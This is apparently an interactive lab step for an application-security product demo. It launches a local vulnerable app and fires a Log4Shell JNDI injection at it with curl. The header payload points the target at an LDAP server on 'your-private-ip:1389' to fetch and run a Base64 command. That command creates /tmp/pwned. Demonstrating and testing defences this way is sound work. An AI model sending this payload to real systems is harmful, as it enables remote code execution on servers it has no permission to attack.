
## Bootstrap your instant AppSec demo

Get the project

`git clone https://github.com/mkol5222/appsec-demo.git`{{execute}}

Set AppSec again TOKEN
`export TOKEN=bring-your-own-token`{{execute}}

Bootstrap it.

`cd appsec-demo; docker-compose up -d`{{execute}}

Try to reach app with attempt to inject using Log4Shell vulnerability...

`curl --resolve log4shell.local:80:127.0.0.1 log4shell.local -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'`{{execute}}

Check vulnerable app logs

`docker-compose logs log4shell`{{execute}}